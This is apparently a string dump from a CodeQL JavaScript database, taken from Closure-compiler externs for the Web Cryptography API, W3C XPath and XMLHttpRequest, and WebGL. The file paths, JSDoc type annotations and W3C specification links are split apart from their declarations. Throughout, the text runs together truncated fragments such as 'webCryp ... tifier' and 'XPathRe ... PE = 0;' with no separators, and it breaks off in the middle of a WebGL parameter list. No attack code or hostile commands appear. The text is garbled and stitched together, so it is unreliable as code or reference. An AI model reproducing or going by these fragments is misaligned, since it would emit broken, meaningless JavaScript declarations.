AES-CTR, AES-GCM, RSA-OAEP, and AES-KW.
Represents the algorithm of the wrapped key.
returns the unwrapped key as a CryptoKey.Web Cryptography APIhttp://www.w3.org/TR/WebCryptoAPI/https://developer.mozilla.org/en/DOM/window.crypto.getRandomValues
webCrypto.SubtleCryptohttp://www.w3.org/TR/WebCryptoAPI/#Crypto-attribute-subtlevar webCrypto = {};webCrypto = {}webCrypto.Algorithm;webCryp ... tifier;webCryp ... ntifierwebCryp ... n() {};webCryp ... on() {}webCryp ... e.type;webCryp ... pe.typewebCryp ... ototypewebCryp ... ctable;webCryp ... actablewebCryp ... orithm;webCryp ... gorithmwebCryp ... usages;webCryp ... .usageswebCryp ... pe.kty;webCryp ... ype.ktywebCryp ... pe.use;webCryp ... ype.usewebCryp ... ey_ops;webCryp ... key_opswebCryp ... pe.alg;webCryp ... ype.algwebCryp ... pe.ext;webCryp ... ype.extwebCryp ... pe.crv;webCryp ... ype.crvwebCryp ... type.x;webCryp ... otype.xwebCryp ... type.y;webCryp ... otype.ywebCryp ... type.d;webCryp ... otype.dwebCryp ... type.n;webCryp ... otype.nwebCryp ... type.e;webCryp ... otype.ewebCryp ... type.p;webCryp ... otype.pwebCryp ... type.q;webCryp ... otype.qwebCryp ... ype.dp;webCryp ... type.dpwebCryp ... ype.dq;webCryp ... type.dqwebCryp ... ype.qi;webCryp ... type.qiwebCryp ... pe.oth;webCryp ... ype.othwebCryp ... type.k;webCryp ... otype.kwebCryp ... mesInfowebCryp ... type.r;webCryp ... otype.rwebCryp ... type.t;webCryp ... otype.twebCryp ... eCryptowebCryp ... ta) {};webCryp ... ata) {}webCryp ... encryptwebCryp ... decryptwebCryp ... pe.signwebCryp ... .verifywebCryp ... .digestwebCryp ... es) {};webCryp ... ges) {}webCryp ... rateKeyfunctio ... ges) {}webCryp ... riveKeywebCryp ... th) {};webCryp ... gth) {}webCryp ... iveBitswebCryp ... portKeywebCryp ... ey) {};webCryp ... key) {}webCryp ... hm) {};webCryp ... thm) {}webCryp ... wrapKeyunwrapp ... gorithmWindow. ... ay) {};Window. ... ray) {}Window. ... mValuesfunctio ... ray) {}Window. ... subtle;Window. ... .subtleH:/codeql/javascript/tools/data/externs/web/w3c_xml.js
 * @fileoverview Definitions for W3C's XML related specifications.
 *  This file depends on w3c_dom2.js.
 *  The whole file has been fully type annotated.
 *
 *  Provides the XML standards from W3C.
 *   Includes:
 *    XPath          - Fully type annotated
 *    XMLHttpRequest - Fully type annotated
 *
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html
 * @see http://www.w3.org/TR/XMLHttpRequest/
 * @see http://www.w3.org/TR/XMLHttpRequest2/
 *
 * @externs
 * @author stevey@google.com (Steve Yegge)
 
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathException
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#INVALID_EXPRESSION_ERR
 /**\n *  ... ERR\n */
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#TYPE_ERR
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#
 /**\n *  ... ml#\n */
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator
 
 * @param {string} expr
 * @param {?XPathNSResolver=} opt_resolver
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createExpression
 * @throws XPathException
 * @throws DOMException
 * @return {undefined}
 
 * @param {Node} nodeResolver
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createNSResolver
 * @return {undefined}
 
 * @param {string} expr
 * @param {Node} contextNode
 * @param {?XPathNSResolver=} opt_resolver
 * @param {?number=} opt_type
 * @param {*=} opt_result
 * @return {XPathResult}
 * @throws XPathException
 * @throws DOMException
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-evaluate
 
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpression
 
 * @param {Node} contextNode
 * @param {number=} opt_type
 * @param {*=} opt_result
 * @return {*}
 * @throws XPathException
 * @throws DOMException
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpression-evaluate
 
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolver
 /**\n *  ... ver\n */
 * @param {string} prefix
 * @return {?string}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolver-lookupNamespaceURI
 
 * From http://www.w3.org/TR/xpath
 *
 * XPath is a language for addressing parts of an XML document, designed to be
 * used by both XSLT and XPointer.
 *
 * @noalias
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult
 /**\n *  ... ult\n */
 * @type {boolean} {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-booleanValue
 
 * @type {boolean} {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-invalid-iterator-state
 
 * @type {number}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-numberValue
 
 * @type {number}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-resultType
 
 * @type {Node}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-singleNodeValue
 
 * @type {number}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshot-length
 
 * @type {string}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-stringValue
 
 * @return {Node}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @throws DOMException {@see DOMException.INVALID_STATE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-iterateNext
 
 * @param {number} index
 * @return {Node}
 * @throws XPathException
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshotItem
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-NUMBER-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-STRING-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-BOOLEAN-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-ITERATOR-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-ITERATOR-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-SNAPSHOT-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-SNAPSHOT-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-UNORDERED-NODE-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-FIRST-ORDERED-NODE-TYPE
 
 * @constructor
 * @extends {Node}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespace
 
 * @type {Element}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespace-ownerElement
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPATH_NAMESPACE_NODE
 /**\n *  ... ODE\n */
 * From http://www.w3.org/TR/XMLHttpRequest/
 *
 * (Draft)
 *
 * The XMLHttpRequest Object specification defines an API that provides
 * scripted client functionality for transferring data between a client and a
 * server.
 *
 * @constructor
 * @implements {EventTarget}
 * @see http://www.w3.org/TR/XMLHttpRequest/#xmlhttprequest-object
 
 * @param {string} method
 * @param {string} url
 * @param {?boolean=} opt_async
 * @param {?string=} opt_user
 * @param {?string=} opt_password
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-open()-method
 
 * @param {string} header
 * @param {string} value
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-setrequestheader()-method
 
 * @param {ArrayBuffer|ArrayBufferView|Blob|Document|FormData|string=} opt_data
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-send()-method
 
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-abort()-method
 
 * @return {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-getallresponseheaders()-method
 
 * @param {string} header
 * @return {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-getresponseheader()-method
 
 * @type {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-responsetext-attribute
 
 * This is not supported in any IE browser (as of August 2016).
 * @type {string}
 * @see https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL
 /**\n *  ... URL\n */
 * @type {Document}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-responsexml-attribute
 
 * @type {number}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-readystate-attribute
 
 * @type {number}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-status-attribute
 
 * @type {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-statustext-attribute
 
 * @type {Function}
 * @see http://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onreadystatechange
 
 * @type {Function}
 * @see http://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onerror
 
 * @type {number}
 * @see https://www.w3.org/TR/XMLHttpRequest/#states
 
 * The FormData object represents an ordered collection of entries. Each entry
 * has a name and value.
 *
 * @param {?Element=} opt_form An optional form to use for constructing the form
 *     data set.
 * @constructor
 * @see http://www.w3.org/TR/XMLHttpRequest2/#the-formdata-interface
 
 * @param {string} name
 * @param {Blob|string} value
 * @param {string=} opt_filename
 * @return {undefined}
 XPathExceptionINVALID_EXPRESSION_ERR52TYPE_ERRXPathEvaluatorcreateExpressionopt_resolvernodeResolvercontextNodeopt_resultXPathExpressionXPathNSResolverXPathResultbooleanValueinvalidInteratorStatenumberValueresultTypesingleNodeValuesnapshotLengthiterateNextsnapshotItemANY_TYPENUMBER_TYPESTRING_TYPEBOOLEAN_TYPEUNORDERED_NODE_ITERATOR_TYPEORDERED_NODE_ITERATOR_TYPEUNORDERED_NODE_SNAPSHOT_TYPEORDERED_NODE_SNAPSHOT_TYPEANY_UNORDERED_NODE_TYPEFIRST_ORDERED_NODE_TYPEXPathNamespaceopt_asyncopt_useropt_passwordsetRequestHeaderheadergetAllResponseHeadersgetResponseHeaderresponseURLresponseXMLUNSENTOPENEDHEADERS_RECEIVEDopt_filenameDefinitions for W3C's XML related specifications.
This file depends on w3c_dom2.js.
The whole file has been fully type annotated.
*  Provides the XML standards from W3C.
Includes:
XPath          - Fully type annotated
XMLHttpRequest - Fully type annotated
*http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html
http://www.w3.org/TR/XMLHttpRequest/
http://www.w3.org/TR/XMLHttpRequest2/
*http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExceptionhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#INVALID_EXPRESSION_ERRhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#TYPE_ERRhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator?XPathNSResolver=?XPathNSResolverhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createExpression
XPathException
DOMException
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createNSResolver
?number=http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-evaluatehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpressionhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpression-evaluatehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolverhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolver-lookupNamespaceURIFrom http://www.w3.org/TR/xpath

XPath is a language for addressing parts of an XML document, designed to be
used by both XSLT and XPointer.http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult{@see XPathException.TYPE_ERR}
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-booleanValuehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-invalid-iterator-stateXPathException {@see XPathException.TYPE_ERR}
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-numberValuehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-resultTypehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-singleNodeValuehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshot-lengthhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-stringValueDOMException {@see DOMException.INVALID_STATE_ERR}
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-iterateNexthttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshotItemhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-NUMBER-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-STRING-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-BOOLEAN-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-ITERATOR-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-ITERATOR-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-SNAPSHOT-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-SNAPSHOT-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-UNORDERED-NODE-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-FIRST-ORDERED-NODE-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespacehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespace-ownerElementhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPATH_NAMESPACE_NODEFrom http://www.w3.org/TR/XMLHttpRequest/

(Draft)

The XMLHttpRequest Object specification defines an API that provides
scripted client functionality for transferring data between a client and a
server.http://www.w3.org/TR/XMLHttpRequest/#xmlhttprequest-objecthttp://www.w3.org/TR/XMLHttpRequest/#the-open()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-setrequestheader()-method(ArrayBuffer|ArrayBufferView|Blob|Document|FormData|string)=(ArrayBuffer|ArrayBufferView|Blob|Document|FormData|string)http://www.w3.org/TR/XMLHttpRequest/#the-send()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-abort()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-getallresponseheaders()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-getresponseheader()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-responsetext-attributeThis is not supported in any IE browser (as of August 2016).https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURLhttp://www.w3.org/TR/XMLHttpRequest/#the-responsexml-attributehttp://www.w3.org/TR/XMLHttpRequest/#the-readystate-attributehttp://www.w3.org/TR/XMLHttpRequest/#the-status-attributehttp://www.w3.org/TR/XMLHttpRequest/#the-statustext-attributehttp://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onreadystatechangehttp://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onerrorhttps://www.w3.org/TR/XMLHttpRequest/#statesThe FormData object represents an ordered collection of entries. Each entry
has a name and value.An optional form to use for constructing the form
data set.
?Element=http://www.w3.org/TR/XMLHttpRequest2/#the-formdata-interface(Blob|string)XPathEx ... R = 52;XPathEx ... RR = 52XPathEx ... ION_ERRXPathEx ... YPE_ERRXPathEx ... e.code;XPathEx ... pe.codeXPathEx ... ototypeXPathEv ... er) {};XPathEv ... ver) {}XPathEv ... ressionXPathEv ... ototypeXPathEv ... esolverXPathEv ... lt) {};XPathEv ... ult) {}XPathEv ... valuatefunctio ... ult) {}XPathEx ... lt) {};XPathEx ... ult) {}XPathEx ... valuateXPathNS ... ix) {};XPathNS ... fix) {}XPathNS ... paceURIXPathNS ... ototypeXPathRe ... nValue;XPathRe ... anValueXPathRe ... ototypeXPathRe ... rState;XPathRe ... orStateinvalid ... orStateXPathRe ... rValue;XPathRe ... erValueXPathRe ... ltType;XPathRe ... ultTypeXPathRe ... eValue;XPathRe ... deValueXPathRe ... Length;XPathRe ... tLengthXPathRe ... gValue;XPathRe ... ngValueXPathRe ... n() {};XPathRe ... on() {}XPathRe ... ateNextXPathRe ... ex) {};XPathRe ... dex) {}XPathRe ... hotItemXPathRe ... PE = 0;XPathRe ... YPE = 0XPathResult.ANY_TYPEXPathRe ... PE = 1;XPathRe ... YPE = 1XPathRe ... ER_TYPEXPathRe ... PE = 2;XPathRe ... YPE = 2XPathRe ... NG_TYPEXPathRe ... PE = 3;XPathRe ... YPE = 3XPathRe ... AN_TYPEXPathRe ... PE = 4;XPathRe ... YPE = 4XPathRe ... OR_TYPEUNORDER ... OR_TYPEXPathRe ... PE = 5;XPathRe ... YPE = 5ORDERED ... OR_TYPEXPathRe ... PE = 6;XPathRe ... YPE = 6XPathRe ... OT_TYPEUNORDER ... OT_TYPEXPathRe ... PE = 7;XPathRe ... YPE = 7ORDERED ... OT_TYPEXPathRe ... PE = 8;XPathRe ... YPE = 8XPathRe ... DE_TYPEANY_UNO ... DE_TYPEXPathRe ... PE = 9;XPathRe ... YPE = 9FIRST_O ... DE_TYPEXPathNa ... lement;XPathNa ... ElementXPathNa ... ototypeXPathNa ... E = 13;XPathNa ... DE = 13XPathNa ... CE_NODEXMLHttp ... rd) {};XMLHttp ... ord) {}XMLHttp ... pe.openXMLHttp ... ue) {};XMLHttp ... lue) {}XMLHttp ... tHeaderXMLHttp ... ta) {};XMLHttp ... ata) {}XMLHttp ... pe.sendXMLHttp ... n() {};XMLHttp ... on() {}XMLHttp ... e.abortXMLHttp ... HeadersgetAllR ... HeadersXMLHttp ... er) {};XMLHttp ... der) {}XMLHttp ... eHeaderfunction(header) {}XMLHttp ... seText;XMLHttp ... nseTextXMLHttp ... nseURL;XMLHttp ... onseURLXMLHttp ... nseXML;XMLHttp ... onseXMLXMLHttp ... yState;XMLHttp ... dyStateXMLHttp ... status;XMLHttp ... .statusXMLHttp ... usText;XMLHttp ... tusTextXMLHttp ... change;XMLHttp ... echangeXMLHttp ... nerror;XMLHttp ... onerrorXMLHttp ... UNSENT;XMLHttp ... .UNSENTXMLHttp ... OPENED;XMLHttp ... .OPENEDXMLHttp ... CEIVED;XMLHttp ... ECEIVEDXMLHttp ... OADING;XMLHttp ... LOADINGXMLHttpRequest.DONE;XMLHttpRequest.DONEFormDat ... me) {};FormDat ... ame) {}FormDat ... .appendFormData.prototypeH:/codeql/javascript/tools/data/externs/web/webgl.js
 * @fileoverview Definitions for WebGL functions as described at
 * http://www.khronos.org/registry/webgl/specs/latest/
 *
 * This file is current up to the WebGL 1.0.1 spec, including extensions.
 *
 * This relies on html5.js being included for Canvas and Typed Array support.
 *
 * This includes some extensions defined at
 * http://www.khronos.org/registry/webgl/extensions/
 *
 * @externs
 
 * @type {!HTMLCanvasElement}
 
 * @return {!WebGLContextAttributes}
 * @nosideeffects
 
 * @return {!Array<string>}
 * @nosideeffects
 
 * Note that this has side effects by enabling the extension even if the
 * result is not used.
 * @param {string} name
 * @return {Object}
 
 * @param {number} texture
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @param {WebGLShader} shader
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @param {number} index
 * @param {string} name
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLBuffer} buffer
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLFramebuffer} buffer
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLRenderbuffer} buffer
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLTexture} texture
 * @return {undefined}
 
 * @param {number} red
 * @param {number} green
 * @param {number} blue
 * @param {number} alpha
 * @return {undefined}
 
 * @param {number} mode
 * @return {undefined}
 
 * @param {number} modeRGB
 * @param {number} modeAlpha
 * @return {undefined}
 
 * @param {number} sfactor
 * @param {number} dfactor
 * @return {undefined}
 
 * @param {number} srcRGB
 * @param {number} dstRGB
 * @param {number} srcAlpha
 * @param {number} dstAlpha
 * @return {undefined}
 
 * @param {number} target
 * @param {ArrayBufferView|ArrayBuffer|number} data
 * @param {number} usage
 * @return {undefined}
 
 * @param {number} target
 * @param {number} offset
 * @param {ArrayBufferView|ArrayBuffer} data
 * @return {undefined}
 
 * @param {number} target
 * @return {number}
 
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} depth
 * @return {undefined}
 
 * @param {number} s
 * @return {undefined}
 
 * @param {boolean} red
 * @param {boolean} green
 * @param {boolean} blue
 * @param {boolean} alpha
 * @return {undefined}
 
 * @param {WebGLShader} shader
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} internalformat
 * @param {number} width
 * @param {number} height
 * @param {number} border
 * @param {ArrayBufferView} data
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} xoffset
 * @param {number} yoffset
 * @param {number} width
 * @param {number} height
 * @param {number} format
 * @param {ArrayBufferView} data
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} format
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @param {number} border
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} xoffset
 * @param {number} yoffset
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @return {undefined}
 
 * @return {!WebGLBuffer}
 * @nosideeffects
 
 * @return {!WebGLFramebuffer}
 * @nosideeffects
 
 * @return {!WebGLProgram}
 * @nosideeffects
 
 * @return {!WebGLRenderbuffer}
 * @nosideeffects
 
 * @param {number} type
 * @return {!WebGLShader}
 * @nosideeffects
 
 * @return {!WebGLTexture}
 * @nosideeffects
 
 * @param {WebGLBuffer} buffer
 * @return {undefined}
 
 * @param {WebGLFramebuffer} buffer
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @return {undefined}
 
 * @param {WebGLRenderbuffer} buffer
 * @return {undefined}
 
 * @param {WebGLTexture} texture
 * @return {undefined}
 
 * @param {number} func
 * @return {undefined}
 
 * @param {boolean} flag
 * @return {undefined}
 
 * @param {number} nearVal
 * @param {number} farVal
 * @return {undefined}
 
 * @param {number} flags
 * @return {undefined}
 
 * @param {number} index
 * @return {undefined}
 
 * @param {number} mode
 * @param {number} first
 * @param {number} count
 * @return {undefined}
 
 * @param {number} mode
 * @param {number} count
 * @param {number} type
 * @param {number} offset
 * @return {undefined}
 
 * @param {number} cap
 * @return {undefined}
 
 * @param {number} target
 * @param {number} attachment
 * @param {number} renderbuffertarget
 * @param {WebGLRenderbuffer} renderbuffer
 * @return {undefined}
 
 * @param {number} target
 * @param {number} attachment
 * @param {number} textarget
 * @param {WebGLTexture} texture
 * @param {number} level
 * @return {undefined}
 
 * @param {number} target
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @param {number} index
 * @return {WebGLActiveInfo}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @return {!Array<WebGLShader>}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {string} name
 * @return {number}
 * @nosideeffects
 
 * @param {number} target
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} target
 * @param {number} attachment
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @return {string}
 * @nosideeffects
 
 * @param {WebGLShader} shader
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} shadertype
 * @param {number} precisiontype
 * @return {WebGLShaderPrecisionFormat}
 * @nosideeffects
 
 * @param {WebGLShader} shader
 * @return {string}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {WebGLUniformLocation} location
 * @return {*}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {string} name
 * @return {WebGLUniformLocation}
 * @nosideeffects
 
 * @param {number} index
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} index
 * @param {number} pname
 * @return {number}
 * @nosideeffects
 
 * @param {number} target
 * @param {number} mode
 * @return {undefined}
 
 * @param {WebGLObject} buffer
 * @return {boolean}
 * @nosideeffects
 
 * @param {number} cap
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} framebuffer
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} program
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} renderbuffer
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} shader
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} texture
 * @return {boolean}
 * @nosideeffects
 
 * @param {number} width
 * @return {undefined}
 
 * @param {number} pname
 * @param {number} param
 * @return {undefined}
 
 * @param {number} factor
 * @param {number} units
 * @return {undefined}
 
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @param {number} format
 * @param {number} type
 * @param {ArrayBufferView} pixels
 * @return {undefined}
 
 * @param {number} target
 * @param {number} internalformat
 * @param {number} width
 * @param {number} height
 * @return {undefined}
 
 * @param {number} coverage
 * @param {boolean} invert
 * @return {undefined}
 
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @return {undefined}
 
 * @param {WebGLShader} shader
 * @param {string} source
 * @return {undefined}
 
 * @param {number} func
 * @param {number} ref
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} face
 * @param {number} func
 * @param {number} ref
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} face
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} fail
 * @param {number} zfail
 * @param {number} zpass
 * @return {undefined}
 
 * @param {number} face
 * @param {number} fail
 * @param {number} zfail
 * @param {number} zpass
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} internalformat
 * @param {number} format or width
 * @param {number} type or height
 * @param {ImageData|HTMLImageElement|HTMLCanvasElement|HTMLVideoElement|
 *     number} img or border
 * @param {number=} opt_format
 * @param {number=} opt_type
 * @param {ArrayBufferView=} opt_pixels
 * @return {undefined}
 
 * @param {number} target
 * @param {number} pname
 * @param {number} param
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} xoffset
 * @param {number} yoffset
 * @param {number} format or width
 * @param {number} type or height
 * @param {ImageData|HTMLImageElement|HTMLCanvasElement|HTMLVideoElement|
 *     number} data or format
 * @param {number=} opt_type
 * @param {ArrayBufferView=} opt_pixels
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {Float32Array|Array<number>} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {Int32Array|Array<number>|Array<boolean>} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value1
 * @param {number} value2
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value1
 * @param {number|boolean} value2
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value1
 * @param {number} value2
 * @param {number} value3
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value1
 * @param {number|boolean} value2
 * @param {number|boolean} value3
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value1
 * @param {number} value2
 * @param {number} value3
 * @param {number} value4
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value1
 * @param {number|boolean} value2
 * @param {number|boolean} value3
 * @param {number|boolean} value4
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {boolean} transpose
 * @param {Float32Array|Array<number>} data
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @return {undefined}
 
 * @param {number} indx
 * @param {Float32Array|Array<number>} values
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @param {number} y
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @param {number} y
 * @param {number} z
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @param {number} y
 * @param {number} z
 * @param {number} w
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} size
